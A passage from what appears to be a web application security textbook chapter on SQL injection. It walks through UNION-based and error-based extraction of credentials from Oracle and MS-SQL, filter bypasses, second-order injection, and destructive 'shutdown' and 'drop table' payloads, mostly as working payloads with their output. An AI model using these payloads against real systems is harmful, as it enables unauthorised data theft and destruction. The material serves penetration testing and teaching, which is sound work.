is\nsufficient for you to inject arbitrary queries that return string-based\ndata and retrieve the results, enabling you to systematically extract any\ndata from the database that you desire.\nHACK STEPS\nYour first task is to discover the number of columns returned by the original\nquery being executed by the application. There are two ways of achieving this:\n■ You can exploit the fact that NULLis convertible to any data type to sys-\ntematically inject queries with different numbers of columns, until your\ninjected query is executed, for example:\n‘ UNION SELECT NULL--\n‘ UNION SELECT NULL, NULL--\n‘ UNION SELECT NULL, NULL, NULL--\nWhen your query is executed, you have determined the number of\ncolumns required. If database error messages are not being returned by\nthe application, you can still tell when your injected query was successful\nbecause an additional row of data will be returned, containing either the\nword NULLor an empty string.\nContinued\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 254\n254 Chapter 9 ■ Injecting Code\nHACK STEPS (continued)\n■ You can inject an ORDER BYclause into the original query and increment\nthe index of the ordering column until an error occurs. For example:\n‘ ORDER BY 1--\n‘ ORDER BY 2--\n‘ ORDER BY 3--\nTypically, the first few cases will return the same results as the original query\nbut in different orders. When an error occurs, you have specified an invalid\ncolumn number, and so have discovered the number of actual columns.\nHaving identified the required number of columns, your next task is to\ndiscover a column that has a string data type, so that you can use this to extract\narbitrary data from the database. You can achieve this by injecting a query\ncontaining NULLs as you did previously, and systematically replacing each NULL\nwith a. For example, if you know that the query must return three columns, you\ncan inject the following:\n‘ UNION SELECT ‘a’, NULL, NULL--\n‘ UNION SELECT NULL, ‘a’, NULL--\n‘ UNION SELECT NULL, NULL, ‘a’--\nWhen your query is executed, you will see an additional row of data\ncontaining the value a. You can then use the relevant column to extract data\nfrom the database.\nNOTE In Oracle databases, every SELECTstatement must include a FROM\nattribute, and so injecting UNION SELECT NULLwill produce an error\nregardless of the number of columns. You can satisfy this requirement by\nselecting from the globally accessible table DUAL. For example:\n‘ UNION SELECT NULL FROM DUAL--\nWhen you have identified the number of columns required in your injected\nquery, and have found a column which has a string data type, you are in a\nposition to extract arbitrary data. A simple proof-of-concept test is to extract\nthe version string of the database, which can be done on any DBMS. For exam-\nple, if there are three columns, and the first column can take string data, you\ncan extract the database version by injecting the following query on MS-SQL\nand MySQL:\n‘ UNION SELECT @@version,NULL,NULL--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 255\nChapter 9 ■ Injecting Code 255\nInjecting the following query will achieve the same result on Oracle:\n‘ UNION SELECT banner,NULL,NULL FROM v$version--\nIn the example of the vulnerable book search application, we can use this\nstring as a search term to retrieve the version of the Oracle database:\nAUTHOR TITLE YEAR\nCORE 9.2.0.1.0 Production\nNLSRTL Version 9.2.0.1.0 - Production\nOracle9i Enterprise Edition Release 9.2.0.1.0 - Production\nPL/SQL Release 9.2.0.1.0 - Production\nTNS for 32-bit Windows: Version 9.2.0.1.0 - Production\nOf course, while the database’s version string may be interesting, and may\nenable you to research vulnerabilities in the specific software being used, in\nmost cases you will be more interested in extracting actual data from the data-\nbase. To do this, you will typically need to address the second proviso\ndescribed earlier; that is, you need to know the name of the database table that\nyou wish to target and the names of its relevant columns. We will describe\ntechniques you can employ to achieve this shortly.\nFingerprinting the Database\nMost of the techniques described so far are effective against all of the common\ndatabase platforms, and any divergences have been accommodated through\nminor adjustments to syntax. However, as we begin to look at more advanced\nexploitation techniques, the differences between platforms become more sig-\nnificant, and you will increasingly need to know which type of back-end data-\nbase you are dealing with.\nYou have already seen how you can extract the version string of the major\ndatabase types. Even if this cannot be done for some reason, it is usually pos-\nsible to fingerprint the database using other methods. One of the most reliable\nis the different means by which databases concatenate strings. In a query\nwhere you control some item of string data, you can supply a particular value\nin one request and then test different methods of concatenation to produce that\nstring. When the same results are obtained, you have probably identified the\ntype of database being used. The following examples show how the string\nservicescould be constructed on the common types of database:\n■■ Oracle: ‘serv’||’ices’\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 256\n256 Chapter 9 ■ Injecting Code\n■■ MS-SQL: ‘serv’+’ices’\n■■ MySQL: ‘serv’ ‘ices’ [note the space]\nIf you are injecting into numeric data, then the following attack strings can\nbe used to fingerprint the database. Each of these items will evaluate to 0 on\nthe target database and generate an error on the other databases:\n■■ Oracle: BITAND(1,1)-BITAND(1,1)\n■■ MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED\n■■ MySQL: CONNECTION_ID()-CONNECTION_ID()\nNOTE The MS-SQL and Sybase databases share a common origin, so many\nsimilarities exist in relation to table structure, global variables, and stored\nprocedures. In practice, the majority of the attack techniques against MS-SQL\ndescribed in later sections will work in an identical way against Sybase.\nA further point of interest when fingerprinting databases is the way in\nwhich MySQL handles certain types of inline comments. If a comment begins\nwith the exclamation point character followed by a database version string,\nthen the contents of the comment are interpreted as actual SQL, provided that\nthe version of the actual database is equal to or later than that string; other-\nwise, the contents are ignored and treated as a comment. This facility can be\nused by programmers in a similar way to preprocessor directives in C,\nenabling them to write different code that will be processed conditionally\nupon the database version being used. It can also be used by an attacker to fin-\ngerprint the exact version of the database. For example, injecting the following\nstring will cause the WHERE clause of a SELECT statement to be false if the\nMySQL version in use is greater than or equal to 3.23.02:\n/*!32302 and 1=0*/\nExtracting Useful Data\nIn order to extract useful data from the database, you normally need to know\nthe names of the tables and columns containing the data you wish to access.\nThe main enterprise DBMS’s contain a rich amount of database metadata that\nyou can query to discover the names of every table and column within the\ndatabase. The methodology for extracting useful data is the same in each case;\nhowever, the details differ on different database platforms. We will examine\nexamples of extracting useful data from Oracle and MS-SQL databases.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 257\nChapter 9 ■ Injecting Code 257\nAn Oracle Hack\nConsider an HR application that allows users to perform employee searches. A\ntypical search employs the following URL:\nhttps://wahh-app.com/employees.asp?EmpNo=7521\nThis search returns the following results:\nID EMPLOYEE JOB\n7521 WARD SALESMAN\nWe attempt to perform a UNION attack, and so need to determine the\nrequired number of columns used in the query (which may differ from the\nnumber of columns returned in the application’s reponses). Injecting a query\nthat returns a single column results in an error message:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL%\n20from%20dual--\n[Oracle][ODBC][Ora]ORA-01789: query block has incorrect number of result\ncolumns\nWe continue adding additional NULLs to the injected query until no error\nmessage is returned, and our query is executed:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL,\nNULL,NULL,NULL%20from%20dual--\nID EMPLOYEE JOB\n7521 WARD SALESMAN\nNote the blank line which has now been added to the table, containing the\nNULLresults from our injected query.\nHaving determined the number of columns, we now need to find a column\nwhich has a string data type. Our first attempt is unsuccessful:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20’a’,\nNULL,NULL,NULL%20from%20dual--\n[Oracle][ODBC][Ora]ORA-01790: expression must have same datatype as\ncorresponding expression\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 258\n258 Chapter 9 ■ Injecting Code\nWe target the second column, and this is successful, returning a row of data\ncontaining the input we specified:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL,\n’a’,NULL,NULL%20from%20dual--\nID EMPLOYEE JOB\n7521 WARD SALESMAN\na\nWe now have a means of extracting string data from the database. Our next\nstep is to find out the names of the database tables that may contain interest-\ning information. We can do this by querying the user_objects table, which\ndisplays details of user-defined tables and other items:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL,\nobject_name,object_type,NULL%20from%20user_objects--\nID EMPLOYEE JOB\n7521 WARD SALESMAN\nBONUS TABLE\nDEPT TABLE\nEMP TABLE\nEMP_GETDATA PROCEDURE\nEMP_TABLE SYNONYM\nGETEMP PROCEDURE\nHIGHSCORE TABLE\nPK_DEPT INDEX\nPK_EMP INDEX\nREMOTE.US.ORACLE.COM DATABASE LINK\nREMOTE.WARGAMES DATABASE LINK\nSALGRADE TABLE\nSCANAPORT PROCEDURE\nTEST123.WARGAMES DATABASE LINK\nUSERS TABLE\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 259\nChapter 9 ■ Injecting Code 259\nNOTE Here we have queried the user_objectstable, which returns all the\nobjects owned by the web application’s database user. You can also query\nall_user_objects, which will return all of the objects that are visible by that\nuser, even if not owned by it.\nMany of these tables may contain sensitive data, including information\nabout employees that we cannot legitimately access given our privilege level.\nAn obvious point of initial attack is the table called USERS, which may contain\ncredentials. We can discover the names of the columns within this table by\nquerying the user_tab_columnstable:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL,\ncolumn_name,NULL,NULL%20from%20user_tab_columns%20where%20table_name%20%\n3d%20’USERS’--\nID EMPLOYEE JOB\n7521 WARD SALESMAN\nID\nLOGIN\nPASSWORD\nPRIVILEGE\nSESSIONID\nWORD\nThis output confirms that the USERS table does indeed contain sensitive\ndata, including passwords and session tokens. We now have everything we\nneed to extract any of this information. For example:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL,\nlogin,password,NULL%20from%20users--\nID EMPLOYEE JOB\n7521 WARD SALESMAN\nadmin 0wned\nmarcus marcus1\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 260\n260 Chapter 9 ■ Injecting Code\nTIP In the attack just described, there are two columns available for retrieving\ndata, and the easiest exploit is to use both. If only one field were available, the\nsame attack could be carried out by concatenating multiple items of extracted\ndata into a single field. For example, the following URL would retrieve\nusernames and passwords within just the Employee field, separated by a colon:\nhttps://wahh-app.com/employees.asp?EmpNo=7521%20UNION%20SELECT%20NULL,\nlogin||’:’||password,NULL,NULL%20from%20user_objects--\nAn MS-SQL Hack\nLet’s take a look at a similar attack being performed against an MS-SQL data-\nbase. Consider a retailing application that allows users to search a product cat-\nalog. A typical search uses the following URL:\nhttps://wahh-app.com/products.asp?q=hub\nThis search returns the following results:\nPRODUCT PRICE\nNetgear Hub (4-port) £30\nNetgear Hub (8-port) £40\nFirst, we need to determine the required number of columns. Testing for a\nsingle column results in an error message:\nhttps://wahh-app.com/products.asp?q=hub’%20union%20select%20null--\n[Microsoft][ODBC SQL Server Driver][SQL Server]All queries in an SQL\nstatement containing a UNION operator must have an equal number of\nexpressions in their target lists.\nWe add a second NULL, and our query is executed, generating an additional\nitem in the results table:\nhttps://wahh-app.com/products.asp?q=hub’%20union%20select%20null,null--\nPRODUCT PRICE\nNetgear Hub (4-port) £30\nNetgear Hub (8-port) £40\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 261\nChapter 9 ■ Injecting Code 261\nWe now verify that the first column in the query contains string data:\nhttps://wahh-app.com/products.asp?q=hub’%20union%20select%20’a’,null--\nPRODUCT PRICE\nNetgear Hub (4-port) £30\nNetgear Hub (8-port) £40\na\nOur next step is to find out the names of the database tables that may con-\ntain interesting information. We can do this by querying the sysobjectstable,\nwhich contains details of all objects within the database. To retrieve only the\nuser-defined objects, we specify the type U:\nhttps://wahh-app.com/products.asp?q=hub’%20union%20select%20name,\nnull%20from%20sysobjects%20where%20xtype%3d’U’--\nPRODUCT PRICE\nNetgear Hub (4-port) £30\nNetgear Hub (8-port) £40\nDtproperties\nMessages\npending_requests\nProducts\nSearchorders\nsession_ids\nSupercomputer\nUsers\nusers_session\nusers_session_passwords\nAgain here, the Userstable is an obvious place to begin extracting data. To\ndiscover the names of columns within the users table, we can query the\nsyscolumnstable:\nhttps://wahh-app.com/products.asp?q=hub’%20UNION%20select%20b.name,null%\n20from%20sysobjects%20a,syscolumns%20b%20where%20a.id=b.id%20and%\n20a.name%3d’users’--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 262\n262 Chapter 9 ■ Injecting Code\nPRODUCT PRICE\nNetgear Hub (4-port) £30\nNetgear Hub (8-port) £40\nLogin\nPassword\nPrivilege\nSessionid\nUid\nWord\nWe now have everything we need to extract the information within the\nUsers table. For example:\nhttps://wahh-app.com/products.asp?q=hub’%20UNION%20select%20login,\npassword%20from%20users--\nPRODUCT PRICE\nNetgear Hub (4-port) £30\nNetgear Hub (8-port) £40\nadmin 0wned\ndev n0ne\nmarcus marcus1\nsmith r00tr0x\ntestuser password\nTIP As with the Oracle hack, the usernames and password could be retrieved\ninto a single column using the +concatenator (encoded as %2b):\nhttps://wahh-app.com/products.asp?q=hub’%20UNION%20select%20login%2b’:\n’%2bpassword,null%20from%20users--\nExploiting ODBC Error Messages (MS-SQL Only)\nIf you are attacking an MS-SQL database, then there are alternative ways avail-\nable of discovering the names of database tables and columns, and of extract-\ning useful data. MS-SQL generates extremely verbose error messages, which\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 263\nChapter 9 ■ Injecting Code 263\ncan be exploited in various ways. The techniques described here were first dis-\ncovered by David Litchfield and Chris Anley in the course of a penetration\ntest, and are described in detail in several whitepapers by them.\nEnumerating Table and Column Names\nRecall the login function described earlier, which performs the following\nSQL query, in which the username and password fields are vulnerable to SQL\ninjection:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nAlthough you can bypass the login by injecting into either of these fields, if\nyou wish to exploit the vulnerability to extract or modify sensitive data, then\nyou will need to know the names of the table and columns involved. Suppose\nthat the table being queried was originally created using the command\ncreate table users( ID int, username varchar(255), password\nvarchar(255), privs int)\nIf ODBC error messages are being returned to your browser, then you can\ntrivially obtain all of this information about the table. The first step is to inject\nthe following string into one of the vulnerable fields:\n‘ having 1=1--\nThis generates the following error message:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e14’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Column ‘users.ID’ is\ninvalid in the select list because it is not contained in an aggregate\nfunction and there is no GROUP BY clause.\nEmbedded in this error message is the item users.ID, which in fact dis-\ncloses the name of the table being queried (users) and the name of the first col-\numn being returned by the query (ID). The next step is to insert the\nenumerated column name into the attack string, which produces this:\n‘ group by users.ID having 1=1--\nSubmitting this value generates the following error message:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e14’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Column ‘users.username’\nis invalid in the select list because it is not contained in either an\naggregate function or the GROUP BY clause.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 264\n264 Chapter 9 ■ Injecting Code\nThis message discloses the name of the second column being returned by\nthe query. You can continue inserting the name of each enumerated column\ninto the attack string, eventually arriving at the following attack string:\n‘ group by users.ID, users.username, users.password, users.privs having\n1=1--\nSubmitting this value does not result in any error message. This confirms\nthat you have now enumerated all of the columns being returned by the query,\nand the order in which they appear.\nThe next step is to determine the data types of each column. Using the infor-\nmation already obtained, you can supply the following input:\n‘ union select sum(username) from users--\nThis input attempts to perform a second query and combine the results with\nthose of the original. It generates the following error message:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average\naggregate operation cannot take a varchar data type as an argument.\nThis error occurs because the database carried out the injected query before\nattempting to combine the results with those of the original. The SUMfunction\nperforms a numeric sum, and takes numeric type data as its input. Because the\nusername column is a string type, this causes an error, and the message dis-\ncloses that the username column is of the specific data type varchar.\nSubmitting the same input with the ID column produces a different error\nmessage:\n‘ union select sum(ID) from users--\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e14’\n[Microsoft][ODBC SQL Server Driver][SQL Server]All queries in an SQL\nstatement containing a UNION operator must have an equal number of\nexpressions in their target lists.\nThis error indicates that the SUM function was successful, and a problem\narose at the point where the database attempted to combine the single column\nreturned by the injected query with the four columns returned by the original\nquery. This effectively confirms that the IDcolumn is a numeric data type.\nYou can repeat this test on each of the fields of the query to confirm their\ndata types. Having done this, you now have sufficient information to extract\narbitrary information from the userstable, and to insert your own data into it.\nFor example, to add a new user account with arbitrary IDand privsvalues,\nyou can submit the following as either of the vulnerable fields:\n‘; insert into users values( 666, ‘attacker’, ‘foobar’, 0xffff )--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 265\nChapter 9 ■ Injecting Code 265\nNOTE MS-SQL allows multiple separate SQL queries to be batched together,\noptionally using a semicolon character as a separator. This enables you to carry\nout an entirely separate statement, even using a different verb, via any SQL\ninjection vulnerability where the database is MS-SQL.\nExtracting Arbitrary Data\nOne particularly useful ODBC error message occurs when the database\nattempts to cast an item of string data to a numeric data type. In this situation,\nthe error message generated actually contains the value of the string item that\ncaused the problem. If error messages are being returned to the browser, this\nbehavior can be a gold mine to an attacker because it allows arbitrary string\ndata to be returned reliably.\nIt is possible to inject into the WHERE clause of a SELECT statement in such a\nway as to perform an arbitrary second query and trigger a failed string con-\nversion on the result. One way of doing this is as follows, which in this exam-\nple returns version information about the database and operating system:\n‘ or 1 in (select @@version)--\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe nvarchar value ‘Microsoft SQL Server 2000 - 8.00.194 (Intel X86)\nAug 6 2000 00:57:48 Copyright (c) 1988-2000 Microsoft Corporation\nEnterprise Edition on Windows NT 5.0 (Build 2195: Service Pack 2) ‘\nto a column of data type int.\nMore interestingly, given the information already gathered, you could\nretrieve the password of the admin user as follows:\n‘ or 1 in (select password from users where username=’admin’)--\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe varchar value ‘0wned’ to a column of data type int.\nTIP There are other ways of causing the database to attempt to convert a\nstring value to a numeric data type:\n■■ You can attempt to “add” a string to a numeric value—for example,\n1+@@version. Because this expression begins with a number, the\ndatabase interprets the +sign as addition rather than concatenation,\nand so attempts to cast each subsequent term to a numeric type.\n■■ You can use the function CASTto mandate any particular cast, for\nexample: SELECT CAST(@@version AS int).\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 266\n266 Chapter 9 ■ Injecting Code\nUsing Recursion\nSuppose that you wish to extract all of the usernames and passwords in the\nusers table. Using the previous extraction technique, you can obtain only a\nsingle item of string data at a time. One way to circumvent this restriction is to\ncraft a query that takes the previous result as its input and returns the next\nresult as its output. Issuing these queries recursively will enable you to cycle\nthrough each of the items of data which you wish to extract.\nFor example, supplying the following input returns an error message con-\ntaining the username that appears alphabetically first in the userstable:\n‘ or 1 in (select min(username) from users where username > ‘a’)--\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe varchar value ‘aaron’ to a column of data type int.\nHaving established the username aaron, you can insert this into the next\nquery as follows:\n‘ or 1 in (select min(username) from users where username > ‘aaron’)--\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe varchar value ‘abbey’ to a column of data type int.\nYou can continue this process recursively until no further usernames are\nreturned. Having saved a list of these usernames, you can then use them to\nretrieve the corresponding passwords directly, as in the earlier example.\nTIP You can use the Recursive Grep payload type in Burp Intruder to\nautomate this attack. To do this, you need to configure the Extract Grep\nfunction to use the following trigger to capture the string data returned in the\nerror message:\nvarchar value ‘\nYou then need to set a single payload position to insert each captured string at\nthe appropriate point in your injected query, and set the initial payload to a.\nThe captured values will be displayed in a column of the results table, and you\nshould let the attack continue until no further items are returned.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 267\nChapter 9 ■ Injecting Code 267\nBypassing Filters\nIn some situations, an application that is vulnerable to SQL injection may\nimplement various input filters that prevent you from exploiting the flaw\nwithout restrictions. For example, the application may remove or sanitize cer-\ntain characters, or may block common SQL keywords. Filters of this kind are\noften vulnerable to bypasses, and there are numerous tricks that you should\ntry in this situation.\nAvoiding Blocked Characters\nIf the application removes or encodes some characters that are often used in\nSQL injection attacks, you may still be able to perform an attack without these:\n■■ The single quotation mark is not required if you are injecting into a\nnumeric data field.\n■■ If the comment symbol is blocked, you can often craft your injected\ndata such that it does not break the syntax of the surrounding query,\neven without using this. For example, instead of injecting\n‘ or 1=1--\nyou can inject\n‘ or ‘a’=’a\n■■ When attempting to inject batched queries into an MS-SQL database,\nyou do not need to use the semicolon separator. Provided you fix up\nthe syntax of all queries in the batch, the query parser will interpret\nthem correctly regardless of whether or not you include a semicolon.\nCircumventing Simple Validation\nSome input validation routines employ a simple blacklist, and either block or\nremove any supplied data which appears on this list. In this instance, you\nshould try the standard attacks looking for common defects in validation and\ncanonicalization mechanisms. For example, if the SELECT keyword is being\nblocked or removed, you can try the following bypasses:\nSeLeCt\nSELSELECTECT\n%53%45%4c%45%43%54\n%2553%2545%254c%2545%2543%2554\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 268\n268 Chapter 9 ■ Injecting Code\nUsing SQL Comments\nInline comments can be inserted into SQL statements in the same way as for\nC++, by embedding them between the symbols /* and */. If the application\nblocks or strips spaces from your input, you can use comments to simulate\nwhitespace within your injected data. For example:\nSELECT/*foo*/username,password/*foo*/FROM/*foo*/users\nIn MySQL, comments can even be inserted within keywords themselves,\nwhich provides another means of bypassing some input validation filters\nwhile preserving the syntax of the actual query. For example:\nSEL/*foo*/ECT username,password FR/*foo*/OM users\nManipulating Blocked Strings\nIf the application blocks certain strings that you wish to place as data items\nwithin an injected query, then the required string can be constructed dynami-\ncally using various string manipulation functions. For example, if the expres-\nsion adminis being blocked, then you can build this in the following ways:\n■■ Oracle:‘adm’||’in’\n■■ MS-SQL:‘adm’+’in’\n■■ MySQL:concat(‘adm’,’in’)\nMost databases contain many custom functions for string manipulation that\ncan be used to construct blocked strings in arbitrarily complex ways, in order\nto circumvent different input validation filters. For example, Oracle contains\nthe functions CHR, REVERSE, TRANSLATE, REPLACE, and SUBSTR. A function like\nCHR can be used to introduce a literal string in cases where single quotation\nmarks are being blocked. For example, the following query effectively smug-\ngles in the string admin:\nSELECT password from users where username = chr(97) || chr(100) ||\nchr(109) || chr(105) || chr(110)\nUsing Dynamic Execution\nSome databases provide a means of executing SQL statements dynamically, by\npassing a string representation of a particular statement to the relevant func-\ntion. For example, in MS-SQL you can use the following:\nexec(‘select * from users’)\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 269\nChapter 9 ■ Injecting Code 269\nThis enables you to employ any of the string manipulation techniques\ndescribed previously anywhere within the statement to bypass filters designed\nto block certain expressions. For example:\nexec(‘sel’ + ‘ect * from ‘ + ‘users’)\nYou can also create a string from hex-encoded numeric data, and then pass\nthis string to the execfunction, enabling you to bypass many kinds of input fil-\nter, including the blocking of single quotation marks, for example:\ndeclare @q varchar(8000)\nselect @q = 0x73656c656374202a2066726f6d207573657273\nexec(@q)\nIn Oracle, you can use EXECUTE IMMEDIATEto execute a query that is repre-\nsented as a string. For example:\ndeclare\nl_cnt varchar2(20);\nbegin\nexecute immediate ‘sel’||’ect * fr’||’om_users’\ninto l_cnt;\ndbms_output.put_line(l_cnt);\nend;\nExploiting Defective Filters\nIt is very common for applications to seek to defend themselves against SQL\ninjection by escaping any single quotation marks that appear within string-\nbased user input (and rejecting any that appear within numeric input). As you\nhave seen, two single quotation marks together are an escape sequence that\nrepresents one literal single quote, which the database will interpret as data\nwithin a quoted string rather than the closing string terminator. Many devel-\nopers reason, therefore, that by doubling up any single quotation marks\nwithin user-supplied input, they will prevent any SQL injection attacks from\noccurring.\nIn addition to doubling up quotation marks, some applications perform\nother operations in an effort to sanitize potentially malicious input. In this sit-\nuation, it may be possible to exploit the ordering of these steps to bypass the\nfilter, as described in Chapter 2.\nRecall the vulnerable login example. Suppose that the application doubles\nup any single quotation marks contained in user input, and also then imposes\na length limit on the data, truncating it to 20 characters. Supplying the\nusername\nadmin’--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 270\n270 Chapter 9 ■ Injecting Code\nnow results in the following query, which fails to bypass the login:\nSELECT * FROM users WHERE username = ‘admin’‘--‘ and password = ‘’\nHowever, if you submit the following username (containing 19 a’s and one\nsingle quotation mark):\naaaaaaaaaaaaaaaaaaa’\nthen the application first doubles up the single quotation mark, and then trun-\ncates the string to 20 characters, returning your input to its original value. This\nresults in a database error, because you have injected an additional single quo-\ntation mark into the query without fixing up the surrounding syntax. If you\nnow also supply the password\n[space]or 1=1--\nthe application performs the following query, which succeeds in bypassing the\nlogin:\nSELECT * FROM users WHERE username = ‘aaaaaaaaaaaaaaaaaaa’‘ and password\n= ‘ or 1=1--‘\nThe doubled-up quotation mark at the end of the string of a’s is interpreted\nas an escaped quotation mark and, therefore, as part of the query data. This\nstring effectively continues as far as the next single quotation mark, which in\nthe original query marked the start of the user-supplied password value. The\nactual username understood by the database will, thus, be the literal string\ndata shown here:\naaaaaaaaaaaaaaaaaaa’ and password =\nHence, whatever comes next will be interpreted as part of the query itself\nand can be crafted to interfere with the query logic.\nTIP You can test for this type of vulnerability without knowing exactly what\nlength limit is being imposed by submitting in turn two long strings of the\nfollowing form:\n‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘ etc.\na’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘’‘ etc.\nand determining whether an error occurs. Any truncation of escaped input will\neither occur after an even number or an odd number of characters. Whichever\npossibility is the case, one of the preceding strings will result in an odd number\nof single quotation marks being inserted into the query, resulting in invalid\nsyntax.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 271\nChapter 9 ■ Injecting Code 271\nSecond-Order SQL Injection\nA particularly interesting type of filter bypass arises in connection with second-\norderSQL injection. As described earlier, it is very common for applications to\nseek to defend themselves against SQL injection by escaping any single quota-\ntion marks that appear within string-based user input (and rejecting any that\nappear within numeric input). Even when this approach is not vulnerable in\nthe ways already described, it can sometimes be bypassed.\nIn the original book search example, this approach appears to be effective.\nWhen the user enters the search term O’Reilly, the application makes the fol-\nlowing query:\nSELECT author,title,year FROM books WHERE publisher = ‘O’‘Reilly’\nHere, the single quotation mark supplied by the user has been converted\ninto two single quotation marks, and so the item passed to the database has the\nsame literal significance as the original expression entered by the user.\nOne problem with the doubling-up approach arises in more complex situa-\ntions where the same item of data passes through several SQL queries, being\nwritten to the database and then read back more than once. This is one exam-\nple of the shortcomings of simple input validationas opposed to boundary vali-\ndation, as described in Chapter 2.\nRecall the application that allowed users to self-register and contained a\nSQL injection flaw in an INSERTstatement. Suppose that developers attempt to\nfix the vulnerability by doubling up any single quotation marks which appear\nwithin user data. Attempting to register the username foo’ results in the fol-\nlowing query, which causes no problems for the database:\nINSERT INTO users (username, password, ID, privs) VALUES (‘foo’‘’,\n‘secret’, 2248, 1)\nSo far, so good. However, suppose that the application also implements a pass-\nword change function. This function is only reachable by authenticated users, but\nfor extra protection, the application requires users to submit their old password.\nIt then verifies that this is correct by retrieving the user’s current password from\nthe database and comparing the two strings. To do this, it first retrieves the user’s\nusername from the database and then constructs the following query:\nSELECT password FROM users WHERE username = ‘foo’‘\nBecause the username stored in the database is the literal string foo’, this is\nthe value that the database returns when this value is queried—the doubled-\nup escape sequence is only used at the point where strings are passed into the\ndatabase. Therefore, when the application reuses this string and embeds it into\na second query, a SQL injection flaw arises and the user’s original bad input is\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 272\n272 Chapter 9 ■ Injecting Code\nembedded directly into the query. When the user attempts to change the pass-\nword, the application returns the following message, which reveals the flaw:\nUnclosed quotation mark before the character string ‘foo\nTo exploit this vulnerability, an attacker can simply register a username con-\ntaining his crafted input, and then attempt to change his password. For exam-\nple, if the following username is registered:\n‘ or 1 in (select password from users where username=’admin’)--\nthen the registration step itself will be handled securely. When the attacker\ntries to change his password, his injected query will be executed, resulting in\nthe following message, which discloses the admin user’s password:\nMicrosoft OLE DB Provider for ODBC Drivers error ‘80040e07’\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting\nthe varchar value ‘fme69’ to a column of data type int.\nThe attacker has successfully bypassed the input validation that was\ndesigned to block SQL injection attacks, and now has a means of executing\narbitrary queries within the database and retrieving the results.\nAdvanced Exploitation\nIn all of the attacks described so far, there has been a ready means of retrieving\nany useful data that was extracted from the database—for example, by per-\nforming a UNIONattack or returning data in an error message. As awareness of\nSQL injection threats has evolved, this kind of situation has become gradually\nless common. It is increasingly the case that the SQL injection flaws that you\nencounter will be in situations where retrieving the results of your injected\nqueries is not straightforward. We shall look at several ways in which this\nproblem can arise, and can be dealt with.\nNOTE Application owners should be aware that not every attacker is\ninterested in stealing sensitive data. Some may be more destructive—for\nexample, by supplying just 12 characters of input, an attacker could turn off an\nMS-SQL database with the shutdowncommand:\n‘ shutdown--\nAn attacker could also inject malicious commands to drop individual tables\nwith commands such as these:\n‘ drop table users--\n‘ drop table accounts--\n‘ drop table customers--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 273\nChapter 9 ■ Injecting Code 273\nRetrieving Data as Numbers\nIt is fairly common to find that no string fields within an application are vul-\nnerable to SQL injection, because input containing single quotation marks is\nbeing properly handled. However, vulnerabilities may still exist within\nnumeric data fields, where user input is not encapsulated within single quotes.\nOften in these situations, the only means of retrieving the results of your\ninjected queries is via a numeric response from the application.\nIn this situation, your challenge is to process the results of your injected\nqueries in such a way that meaningful data can be retrieved in numeric form.\nThere are two key functions that can be used here:\n■■ ASCII, which returns the ASCII code for the input character.\n■■ SUBSTRING(or SUBSTRin Oracle), which returns a substring of its input.\nThese functions can be used together to extract a single character from a\nstring, in numeric form. For example:\nSUBSTRING(‘Admin’,1,1)returns A\nASCII(‘A’)returns 65\nTherefore:\nASCII(SUBSTR(‘Admin’,1,1))returns 65\nUsing these two functions, you can systematically cut up a string of useful\ndata into its individual characters, and return each of these separately, in\nnumeric form. In a scripted attack, this technique can be used to quickly\nretrieve and reconstruct a large amount of string-based data, one byte at a\ntime.\nTIP There are numerous subtle variations in the way different database\nplatforms handle string manipulation and numeric computation, which you may\nneed to take account of when performing advanced attacks of this kind. An\nexcellent guide to 